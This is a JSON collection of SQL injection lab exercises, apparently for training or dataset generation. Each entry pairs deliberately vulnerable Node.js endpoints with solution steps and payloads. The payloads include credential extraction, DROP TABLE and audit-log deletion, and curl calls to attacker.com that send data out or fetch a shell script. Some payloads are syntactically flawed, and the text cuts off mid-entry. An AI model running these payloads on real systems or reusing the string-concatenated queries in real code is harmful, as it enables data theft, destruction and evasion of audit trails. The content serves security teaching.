[
  {
    "Lab scenario": "Banking Portal SQL injection in ORDER BY Clause via UNION Attack",
    "Lab Description": "The transaction sorting feature in a banking portal directly concatenates user input into ORDER BY clauses. The application leaks database errors through verbose logging. To solve: Extract account balances using UNION-based injection while bypassing column type restrictions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept sorting request with Burp Suite",
      "Determine column count using ORDER BY 4-- payloads",
      "Bypass type checks with CAST(): ' UNION SELECT CAST(balance AS TEXT),2,3,4 FROM accounts--",
      "Identify numeric columns through error analysis",
      "Exfiltrate full transaction history using hex encoding"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pool = require('./db').pool;\n\napp.get('/transactions', (req, res) => {\n  const sort = req.query.sort || 'id';\n  const query = `SELECT id, amount, date FROM transactions ORDER BY ${sort}`;\n  \n  pool.query(query, (err, result) => {\n    if(err) {\n      console.error(`FULL QUERY: ${query}\\nERROR: ${err.stack}`); // Error leakage\n      res.status(500).send('Payment system error');\n    } else {\n      res.json(result.rows);\n    }\n  });\n});",
    "payloads": [
      "CASE WHEN (1=1) THEN amount ELSE date END--",
      "' UNION SELECT CAST(balance AS TEXT),2,3 FROM accounts--",
      "' AND 1=CAST((SELECT current_database()) AS INTEGER)--"
    ]
  },
  {
    "Lab scenario": "IoT Device Manager Boolean-Based Blind SQLi in HAVING Clause",
    "Lab Description": "An IoT device management dashboard filters sensor data using vulnerable HAVING conditions. No direct output is shown, but HTTP 200/500 status codes indicate query truthiness. To solve: Determine admin API key through binary search of character space.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to fuzz HAVING parameter",
      "Identify boolean trigger: ' HAVING 1=1 -- vs 1=0",
      "Automate with sqlmap: sqlmap -u '...' --technique=B --level=5",
      "Brute-force API key using substring binary search",
      "Validate key through device control API endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/sensor-aggregate', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings GROUP BY sensor_id HAVING ${filter}`;\n  \n  db.query(query, (err, result) => {\n    if(err) return res.status(500).send();\n    res.status(200).json({count: result.rowCount});\n  });\n});",
    "payloads": [
      "1=1 AND (SELECT SUBSTR(apikey,1,1) FROM admins)='a'",
      "EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='devices')",
      "(SELECT LENGTH(apikey) FROM admins)=32 AND 1=1"
    ]
  },
  {
    "Lab scenario": "CMS User Search Time-Based Injection via GraphQL",
    "Lab Description": "A headless CMS exposes GraphQL endpoint with vulnerable user search. Responses show identical success/failure states. To solve: Exfiltrate password hashes through conditional response delays using DNS over HTTP.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture GraphQL query with Postman",
      "Identify injectable field using pg_sleep(5) payloads",
      "Set up collaborator server for OOB exfiltration",
      "Craft time-based payload with CASE statements",
      "Correlate response times with character values"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    users(_, { search }) {\n      return db.query(`SELECT * FROM users WHERE ${search}`);\n    }\n  }\n};",
    "payloads": [
      "1=1; SELECT CASE WHEN (SUBSTR(hash,1,1)='a') THEN pg_sleep(5) ELSE 0 END FROM passwords",
      "1=1 AND (SELECT MAKE_SET(2063,CONCAT('exfil.',(SELECT hash)))"
    ]
  },
  {
    "Lab scenario": "REST API Gateway UNION Injection Through JSON Parameter",
    "Lab Description": "An inventory management API processes JSON payloads without type validation. The /search endpoint concatenates JSON array values directly into SELECT. To solve: Dump user credentials through type juggling attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify Content-Type to application/json in Postman",
      "Identify JSON array injection point: {\"filters\":[\"1=1\"]}",
      "Bypass WAF using Unicode escapes: \\u0027 UNION...",
      "Extract schema via json_agg() function",
      "Convert results to base64 for exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const filters = req.body.filters.join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  //...\n});",
    "payloads": [
      "1=1] UNION SELECT null,version(),null--",
      "\" OR 1=1 UNION SELECT table_name,column_name FROM information_schema.columns--"
    ]
  },
  {
    "Lab scenario": "Payment Processor Error-Based Injection in GROUP BY",
    "Lab Description": "A payment analytics dashboard leaks PostgreSQL errors through misconfigured grouping. To solve: Extract PCI-compliant credit card numbers using verbose error messages with CTE injections.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Trigger error with invalid GROUP BY clause",
      "Extract version info from error message",
      "Use CTE to stack queries: ; WITH ...",
      "Cast sensitive data to incompatible types",
      "Bypass PCI logging through error channels"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/reports', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT ${group} FROM payments GROUP BY ${group}`;\n  //...\n});",
    "payloads": [
      "(SELECT 1/0 FROM credit_cards LIMIT 1)",
      "GROUP BY (CAST((SELECT pan FROM cards) AS INTEGER))"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Second-Order SQLi in User Registration",
    "Lab Description": "Patient registration form stores unsanitized input later used in batch reports. To solve: Trigger delayed injection during nightly report generation using temp table pollution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register patient with time-based payload",
      "Monitor scheduled tasks with Burp Collaborator",
      "Create temp table with credential data",
      "Set up trigger-based exfiltration",
      "Harvest data from scheduled report outputs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const note = req.body.medical_notes;\n  db.query(`INSERT INTO patients (notes) VALUES ('${note}')`);\n});",
    "payloads": [
      "'); CREATE TEMP TABLE exfil AS SELECT * FROM staff--",
      "'); COPY (SELECT * FROM diagnoses) TO PROGRAM 'curl https://attacker.com/?exfil=$(data)'--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform JSON Array Injection in WHERE Clause",
    "Lab Description": "Product search feature parses JSON arrays directly into SQL conditions. To solve: Bypass parameterized queries through JSON nesting and type confusion attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Convert normal request to JSON array format",
      "Escape array context using nested objects",
      "Chain multiple injections with boolean logic",
      "Bypass prepared statements via type juggling",
      "Combine with XSS for stored exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/products', (req, res) => {\n  const filters = JSON.parse(req.body);\n  const conditions = filters.map(f => `${f.field}=${f.value}`).join(' AND ');\n  const query = `SELECT * FROM products WHERE ${conditions}`;\n});",
    "payloads": [
      "[{\"field\":\"1\",\"value\":\"1' UNION SELECT 1,version()--\"}]",
      "[{\"field\":\"price\",\"value\":\"0 OR 1=1\"}]"
    ]
  },
  {
    "Lab scenario": "Inventory Management UNION Injection with Column Padding",
    "Lab Description": "Legacy inventory system uses fixed column counts in UNION queries. To solve: Bypass column count validation through NULL padding and type coercion.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Determine base column count using ORDER BY",
      "Bypass UNION restrictions with ALL SELECT",
      "Use NULL and type casts to match columns",
      "Extract system files using COPY TO",
      "Decode base64 results in HTTP responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/items', (req, res) => {\n  const category = req.query.cat;\n  const query = `SELECT id, name FROM items WHERE category='${category}'`;\n});",
    "payloads": [
      "' UNION ALL SELECT CAST(id AS TEXT), password FROM users--",
      "' UNION SELECT NULL, LOAD_EXTENSION('evil.dll')--"
    ]
  },
  {
    "Lab scenario": "CRM System Blind Injection via WebSocket Messages",
    "Lab Description": "Real-time contact search uses WebSockets with no input validation. To solve: Perform blind boolean injection through response message ordering.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket handshake with Burp",
      "Craft binary WebSocket frames with injection payloads",
      "Measure response timing using sequence analysis",
      "Use bit-shifting to optimize character extraction",
      "Reconstruct session tokens through statistical analysis"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "ws.on('message', (query) => {\n  db.query(`SELECT * FROM contacts WHERE ${query}`, (err, res) => {\n    ws.send(JSON.stringify(res));\n  });\n});",
    "payloads": [
      "1=1; SELECT CASE WHEN (ASCII(SUBSTR(token,1,1))>100 THEN pg_sleep(2) END FROM sessions",
      "1=1 AND (SELECT COUNT(*) FROM users WHERE permissions=0xdeadbeef)=1"
    ]
  },
  {
    "Lab scenario": "Learning Management System Polyglot Injection in CSV Export",
    "Lab Description": "Grade export feature vulnerable to injection through CSV formula fields. To solve: Execute operating system commands through SQL injection with PostgreSQL large object imports.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Trigger CSV export with malicious formula",
      "Bypass CSV escaping through UTF-7 encoding",
      "Use PostgreSQL lo_import to read server files",
      "Combine with COPY FROM PROGRAM for RCE",
      "Clean attack artifacts through vacuum operations"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export', (req, res) => {\n  const filter = req.query.filter;\n  const query = `COPY (SELECT * FROM grades WHERE ${filter}) TO STDOUT CSV`;\n});",
    "payloads": [
      "1=1); COPY grades FROM PROGRAM 'curl https://attacker.com/shell.sh'--",
      "1=1 UNION SELECT LO_IMPORT('/etc/passwd')::text"
    ]
  },
  {
    "Lab scenario": "REST API Boolean-Based Blind SQLi in Login",
    "Lab Description": "A REST API login endpoint uses dynamic SQL without sanitization. No error messages are returned, but a JWT token is issued on success. To solve: Perform boolean-based blind SQLi to extract the admin password character-by-character.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send POST /api/login requests",
      "Test boolean conditions: admin' AND 1=1-- vs 1=0",
      "Automate with sqlmap: sqlmap -r request.txt --technique=B --dbms=SQLite",
      "Brute-force password using SUBSTR and binary search",
      "Submit extracted password to obtain JWT token"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/login', (req, res) => {\n  const { user, pass } = req.body;\n  const query = `SELECT * FROM users WHERE username='${user}' AND password='${pass}'`;\n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 401).json(row ? { token: '...' } : {});\n  });\n});",
    "payloads": [
      "admin' AND SUBSTR(password,1,1)='a'--",
      "admin' AND (SELECT LENGTH(password) FROM users)=32--",
      "admin' AND (SELECT hex(password) LIKE '25%')--"
    ]
  },
  {
    "Lab scenario": "GraphQL Union-Based SQLi in IoT Device Query",
    "Lab Description": "A GraphQL resolver for IoT devices concatenates user input into a SQL query. Results are returned as JSON. To solve: Use UNION injection to retrieve device API keys from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft GraphQL query with malicious deviceId parameter",
      "Inject: deviceId: \"123' UNION SELECT 1, api_key FROM devices--\"",
      "Verify API keys appear in JSON response",
      "Refine payload to extract specific credentials",
      "Use extracted keys to access device controls"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    device: (_, { id }) => {\n      const query = `SELECT id, status FROM devices WHERE id='${id}'`;\n      return db.get(query);\n    }\n  }\n};",
    "payloads": [
      "123' UNION SELECT id, api_key FROM devices--",
      "456' UNION SELECT 1, sqlite_version()--",
      "789' UNION SELECT NULL, group_concat(api_key) FROM devices--"
    ]
  },
  {
    "Lab scenario": "CMS Header-Based Blind SQLi with Boolean Inference",
    "Lab Description": "A CMS logs HTTP headers into a SQL database. A log preview feature reflects entries matching boolean conditions. To solve: Extract admin email via boolean-based blind SQLi in the X-Search-Token header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept request with Burp Suite and modify X-Search-Token",
      "Test: 'xyz' AND (SELECT 1 FROM users WHERE role='admin')=1--",
      "Check log preview for presence/absence of entry",
      "Automate with Python to infer email characters",
      "Extract full email via SUBSTR and binary search"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const token = req.headers['x-search-token'];\n  db.run(`INSERT INTO logs (entry) VALUES ('${token}')`);\n  res.send('Search logged');\n});",
    "payloads": [
      "test' AND (SELECT LENGTH(email) FROM users WHERE role='admin')=20--",
      "test' AND (SELECT hex(substr(email,1,1)) FROM users)='61'--",
      "test' AND (SELECT COUNT(*) FROM sqlite_master)=5--"
    ]
  },
  {
    "Lab scenario": "SOAP API Time-Based SQLi with XML Input",
    "Lab Description": "A SOAP login service uses XML input in dynamic SQL. Responses lack feedback, but delays indicate query truthiness. To solve: Extract admin password via time-based delays.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send XML payloads with time-delay conditions",
      "Use payload: ' OR CASE WHEN (SUBSTR(password,1,1)='a') THEN randomblob(100000000) ELSE 0 END--",
      "Measure response times with Burp Suite's Repeater",
      "Automate extraction with Python requests and timing",
      "Reconstruct password from observed delays"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/soap/login', (req, res) => {\n  const xml = req.rawBody;\n  const user = extractXPath(xml, '//username');\n  const query = `SELECT * FROM users WHERE username='${user}'`;\n  db.get(query, (err, row) => {\n    res.send(`<success>${!!row}</success>`);\n  });\n});",
    "payloads": [
      "' OR CASE WHEN (SUBSTR(password,1,1)='a') THEN randomblob(100000000) END--",
      "' OR CASE WHEN (LENGTH(password)=32) THEN randomblob(100000000) END--"
    ]
  },
  {
    "Lab scenario": "E-Commerce GROUP BY SQLi with UNION Payloads",
    "Lab Description": "A product grouping feature uses unsanitized input in GROUP BY. The application returns grouped results as JSON. To solve: Extract database schema via UNION-based injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept /products?group=category request",
      "Determine column count with ORDER BY",
      "Inject: group=category UNION SELECT sql,NULL FROM sqlite_master--",
      "Parse schema details from JSON response",
      "Extract table structures for users and orders"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const group = req.query.group || 'category';\n  const query = `SELECT ${group}, COUNT(*) FROM products GROUP BY ${group}`;\n  db.all(query, (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "category UNION SELECT tbl_name, sql FROM sqlite_master--",
      "price UNION SELECT NULL, group_concat(tbl_name) FROM sqlite_master--"
    ]
  },
  {
    "Lab scenario": "Newsletter Signup Error-Based SQLi with URL Encoding",
    "Lab Description": "A newsletter endpoint uses URL parameters directly in SQL. Verbose errors leak database information. To solve: Extract subscriber emails via UNION-based error injection.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Send GET /subscribe?email=test%40test.com",
      "Trigger error: 'test%27 AND 1=CAST(version() AS INTEGER)--",
      "Extract DB version from error message",
      "Inject UNION SELECT to dump emails",
      "Parse emails from HTML response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/subscribe', (req, res) => {\n  const email = req.query.email;\n  db.run(`INSERT INTO subscribers(email) VALUES('${email}')`, (err) => {\n    if (err) res.status(500).send(`Error: ${err.message}`);\n    else res.send('Subscribed!');\n  });\n});",
    "payloads": [
      "test%40test.com' UNION SELECT email FROM subscribers--",
      "test' AND 1=CAST((SELECT group_concat(email) FROM subscribers) AS INTEGER)--"
    ]
  },
  {
    "Lab scenario": "SQLite Stacked Queries in Login Form",
    "Lab Description": "A login form allows stacked queries in SQLite. To solve: Update the admin password and authenticate.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit username: admin'; UPDATE users SET password='pwned' WHERE username='admin'--",
      "Log in with username: admin and password: pwned",
      "Verify access to admin dashboard"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { user, pass } = req.body;\n  db.get(`SELECT * FROM users WHERE username='${user}' AND password='${pass}'`, (err, row) => {\n    res.send(row ? 'Success' : 'Failed');\n  });\n});",
    "payloads": [
      "admin'; INSERT INTO users(username, password) VALUES ('attacker', 'pwned')--",
      "admin'; DROP TABLE users--"
    ]
  },
  {
    "Lab scenario": "AJAX Autocomplete UNION SQLi in LIKE Clause",
    "Lab Description": "An autocomplete endpoint uses unsanitized input in a LIKE clause. To solve: Extract user emails via UNION injection.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Send GET /autocomplete?q=a%25",
      "Inject: %' UNION SELECT email FROM users--",
      "Observe emails in JSON response",
      "Refine payload to extract all records"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/autocomplete', (req, res) => {\n  const term = req.query.q || '';\n  db.all(`SELECT name FROM products WHERE name LIKE '%${term}%'`, (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "%' UNION SELECT email FROM users--",
      "%' UNION SELECT password FROM users WHERE username='admin'--"
    ]
  },
  {
    "Lab scenario": "Blog Comment Form INSERT-Based SQLi with Error Extraction",
    "Lab Description": "The blog comment system directly interpolates user input into an INSERT statement. While UNION injection isn't possible, error messages leak schema information. To solve: Extract table names via error-based SQLi.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit comment with author: '||(SELECT 1/0 FROM sqlite_master)--",
      "Analyze error message for database schema details",
      "Iterate payloads to reveal table structures",
      "Extract credentials using CAST-based errors"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const { author, comment } = req.body;\n  const query = `INSERT INTO comments (author, comment) VALUES ('${author}', '${comment}')`;\n  db.run(query);\n  res.redirect('/blog');\n});",
    "payloads": [
      "'||(SELECT load_extension('invalid'))--",
      "'||(SELECT 1 FROM sqlite_master WHERE tbl_name='users' AND 1=CAST(randomblob(1000000000) AS INTEGER))--"
    ]
  },
  {
    "Lab scenario": "Cookie-Based Authentication Bypass with Tautology",
    "Lab Description": "Session validation uses cookies in a WHERE clause without sanitization. To solve: Bypass authentication using boolean logic and access admin profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept request and modify session cookie to: admin' OR '1'='1'--",
      "Bypass authentication through tautological WHERE clause",
      "Access privileged endpoints with valid session"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const session = req.cookies.session_id;\n  const query = `SELECT * FROM sessions WHERE session_id='${session}'`;\n  db.get(query, [], (err, user) => {\n    res.render('profile', { user });\n  });\n});",
    "payloads": [
      "admin' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--",
      "xyz' UNION SELECT 1,'admin','admin'--"
    ]
  },
  {
    "Lab scenario": "API Key Validation UNION SQLi with Column Matching",
    "Lab Description": "API key validation vulnerable to UNION injection. To solve: Determine column count and extract user credentials through careful UNION payload construction.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Determine column count using ORDER BY",
      "Identify string-compatible columns with NULL placeholders",
      "Inject: ' UNION SELECT username,password,NULL FROM users--",
      "Parse credentials from API response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/data', (req, res) => {\n  const key = req.query.key;\n  const query = `SELECT id, key, created_at FROM api_keys WHERE key='${key}'`;\n  db.get(query, [], (err, result) => {\n    if (result) res.json({ data: \"secure data\" });\n    else res.status(403).send(\"Invalid key\");\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,NULL,NULL--",
      "' UNION SELECT username,password,NULL FROM users--"
    ]
  },
  {
    "Lab scenario": "Second-Order SQLi in Analytics Report Generation",
    "Lab Description": "Bio field stored without sanitization and later used in admin reports. To solve: Poison bio field with SQL that executes during report generation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Update bio to: ', (SELECT group_concat(email) FROM users))--",
      "Trigger admin report generation",
      "Extract emails from corrupted report output"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/admin/report', (req, res) => {\n  db.all(`SELECT id, bio FROM users`, [], (err, rows) => {\n    res.send(rows.map(r => `${r.id}: ${r.bio}`).join('<br>'));\n  });\n});",
    "payloads": [
      "', (SELECT sql FROM sqlite_master))--",
      "', (SELECT hex(password) FROM users WHERE id=1))--"
    ]
  },
  {
    "Lab scenario": "Dynamic Table Name SQLi with System Table Access",
    "Lab Description": "Table parameter vulnerable to schema enumeration. To solve: Extract database structure through controlled UNION attacks.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Determine base table column count",
      "Inject: (SELECT name FROM sqlite_master LIMIT 1) UNION SELECT name,sql FROM sqlite_master--",
      "Analyze response for schema details",
      "Extract credentials from discovered tables"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/admin', (req, res) => {\n  const table = req.query.table;\n  const query = `SELECT name, type FROM ${table}`;\n  db.all(query, [], (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "(SELECT name FROM sqlite_master) UNION SELECT tbl_name,sql FROM sqlite_master--",
      "users UNION SELECT name,password FROM users--"
    ]
  },
  {
    "Lab scenario": "JSON Body SQLi with Content-Type Bypass",
    "Lab Description": "API endpoint vulnerable through JSON parameter injection. To solve: Bypass Content-Type validation and extract sensitive data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set Content-Type: application/json",
      "Send payload: {\"username\": \"admin' UNION SELECT NULL,password,NULL FROM users--\"}",
      "Handle JSON parsing errors through response analysis",
      "Extract hashed passwords from nested responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/user-info', (req, res) => {\n  const username = req.body.username;\n  const query = `SELECT id, username, role FROM users WHERE username='${username}'`;\n  db.get(query, [], (err, user) => {\n    res.json(user);\n  });\n});",
    "payloads": [
      "admin' UNION SELECT 1,password,1 FROM users--",
      "admin' AND 1=CAST((SELECT COUNT(*) FROM users) AS INTEGER)--"
    ]
  },
  {
    "Lab scenario": "Error-Based Password Recovery SQLi",
    "Lab Description": "Password recovery form leaks schema through verbose errors. To solve: Extract table structure via type conversion errors.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit email: ' AND (SELECT 1 FROM sqlite_master WHERE tbl_name='users')=1--",
      "Analyze error message for schema validation",
      "Brute-force column names using incremental CAST operations"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/forgot-password', (req, res) => {\n  const email = req.body.email;\n  const query = `SELECT * FROM users WHERE email='${email}'`;\n  db.get(query, [], (err, user) => {\n    if (err) res.status(500).send(`Error: ${err.message}`);\n    else res.send(user ? \"Email sent\" : \"Invalid email\");\n  });\n});",
    "payloads": [
      "' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INTEGER)--",
      "' AND (SELECT LENGTH(password) FROM users WHERE email='admin@example.com')=60--"
    ]
  },
  {
    "Lab scenario": "Verification Token SQLi with Stacked Queries",
    "Lab Description": "Verification endpoint vulnerable to stacked queries in PostgreSQL. To solve: Escalate privileges through batched SQL commands.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft token parameter: '; UPDATE users SET role='admin' WHERE email='user@example.com';--",
      "Trigger verification endpoint",
      "Confirm privilege escalation through admin panel access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/verify', (req, res) => {\n  const token = req.query.token;\n  const query = `UPDATE users SET verified=true WHERE token='${token}'`;\n  db.run(query);\n  res.send(\"Verified\");\n});",
    "payloads": [
      "'; INSERT INTO users(email, role) VALUES ('attacker@test.com','admin');--",
      "'; DROP TABLE audit_logs;--"
    ]
  },
  {
    "Lab scenario": "Pagination SQLi with OFFSET Clause Manipulation",
    "Lab Description": "Pagination logic vulnerable through OFFSET parameter. To solve: Inject UNION payload into numeric parameter to extract database version.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Bypass numeric validation using scientific notation: 0e0 UNION SELECT sqlite_version()--",
      "Handle type conversion errors through nested queries",
      "Extract DB version from JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const page = Number(req.query.page);\n  const size = Number(req.query.size);\n  const query = `SELECT * FROM products LIMIT ${size} OFFSET ${page * size}`;\n  db.all(query, [], (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "0 UNION SELECT 1,2,sqlite_version(),4--",
      "0 AND 1=CAST((SELECT name FROM sqlite_master) AS INTEGER)--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Portal UNION-Based SQLi in ORDER BY Clause",
    "Lab Description": "Product sorting feature in Node.js application directly concatenates user input into ORDER BY clause. The application returns full query errors. To solve: Extract user credentials through UNION attack requiring column type matching.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept /products?sort= request with Burp Suite",
      "Determine column count: ' ORDER BY 5--",
      "Identify string columns: ' UNION SELECT 'a','b','c','d','e'--",
      "Extract credentials: ' UNION SELECT username,password,NULL,NULL,NULL FROM users--",
      "Verify via login API endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst db = require('./database');\n\napp.get('/products', (req, res) => {\n  const sort = req.query.sort || 'id';\n  const query = `SELECT id,name,price FROM products ORDER BY ${sort}`;\n  \n  db.query(query, (err, result) => {\n    if(err) {\n      console.error('Full query:', query, '\\nError:', err); // Error leakage\n      res.status(500).send('Error: ' + err.message);\n    } else {\n      res.json(result.rows);\n    }\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
      "' UNION SELECT username,password,1,1,1 FROM users--",
      "' ORDER BY (SELECT 1 FROM users WHERE username='admin')--"
    ]
  },
  {
    "Lab scenario": "Healthcare API Boolean-Based Blind SQLi in WHERE Clause",
    "Lab Description": "Patient lookup API returns HTTP 200/404 status codes based on query results. No error messages. To solve: Determine sensitive patient SSN through binary search character extraction.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture POST /api/patient-lookup with OWASP ZAP",
      "Identify boolean condition: ' OR 1=1 AND 'a'='a",
      "Automate with sqlmap: sqlmap -r request.txt --technique=B --dbms=PostgreSQL",
      "Brute-force SSN using substring comparisons",
      "Validate through insurance claim endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/patient-lookup', (req, res) => {\n  const patientId = req.body.id;\n  const query = `SELECT * FROM patients WHERE id='${patientId}' AND is_active=true`;\n  \n  db.query(query, (err, result) => {\n    if(result.rows.length > 0) {\n      res.status(200).send({found: true});\n    } else {\n      res.status(404).send({found: false});\n    }\n  });\n});",
    "payloads": [
      "' OR (SELECT SUBSTRING(ssn,1,1) FROM patients LIMIT 1)='5'--",
      "' AND (SELECT LENGTH(ssn) FROM patients WHERE id=1)=9--"
    ]
  },
  {
    "Lab scenario": "IoT Device Manager Time-Based SQLi in GROUP BY Clause",
    "Lab Description": "Device analytics dashboard vulnerable to blind injection through GROUP BY parameter. Responses identical but delay observable. To solve: Exfiltrate API keys through conditional response delays.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept /analytics request with Burp Suite",
      "Identify injectable parameter: group=day",
      "Confirm time delay: '; SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE NULL END--",
      "Brute-force API key character by character",
      "Use extracted key in device control API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/analytics', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT COUNT(*), ${group} FROM devices GROUP BY ${group}`;\n  \n  db.query(query, (err, result) => {\n    // No error returned\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "; SELECT CASE WHEN (ASCII(SUBSTR(api_key,1,1))>100 THEN pg_sleep(5) ELSE NULL END FROM devices--",
      " UNION SELECT NULL,(SELECT pg_sleep(5) FROM api_keys)--"
    ]
  },
  {
    "Lab scenario": "CMS Platform Error-Based SQLi in HAVING Clause",
    "Lab Description": "Content analytics page leaks PostgreSQL errors through misconfigured HAVING clause. To solve: Extract admin credentials through verbose error messages.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept /analytics request with Burp Suite",
      "Trigger error: ' HAVING 1=CAST((SELECT version()) AS INT)--",
      "Extract table names from error messages",
      "Retrieve credentials using CTE expressions",
      "Bypass WAF using URL encoding"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/analytics', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT category, COUNT(*) FROM posts GROUP BY category HAVING ${filter}`;\n  \n  db.query(query, (err, result) => {\n    if(err) res.status(500).send(err.toString()); // Error leakage\n    else res.json(result.rows);\n  });\n});",
    "payloads": [
      "1=CAST((SELECT current_database()) AS INTEGER)--",
      "1=1 AND (SELECT 1 FROM users WHERE username='admin')=1--"
    ]
  },
  {
    "Lab scenario": "Banking Portal Second-Order SQLi in User Registration",
    "Lab Description": "User registration stores unsanitized input used in batch reports. To solve: Trigger scheduled report generation to exfiltrate account balances.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Register user with malicious comment: ' || (SELECT balance FROM accounts))--",
      "Wait for nightly report generation",
      "Monitor system logs for SQL errors",
      "Extract data through error-based injection",
      "Clean audit logs using stacked queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const comment = req.body.comment;\n  const query = `INSERT INTO users (username, comment) VALUES ('${req.body.user}', '${comment}')`;\n  \n  db.query(query, () => {\n    res.send('Registration pending approval');\n  });\n});",
    "payloads": [
      "'||(SELECT balance FROM accounts WHERE user='admin')--",
      "'; UPDATE accounts SET balance=1000000 WHERE user='attacker'--"
    ]
  },
  {
    "Lab scenario": "REST API Gateway UNION SQLi in JSON Parameter",
    "Lab Description": "Inventory API processes JSON array input without validation. To solve: Bypass WAF protections and extract database schema through UNION attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify Content-Type to application/json",
      "Craft JSON payload: {\"filter\":[\"1' UNION SELECT version(),NULL--\"]}",
      "Bypass WAF using Unicode escapes: \\u0027 UNION...",
      "Extract schema via information_schema.tables",
      "Encode results in base64"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/inventory', (req, res) => {\n  const filters = req.body.filter.join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  \n  db.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
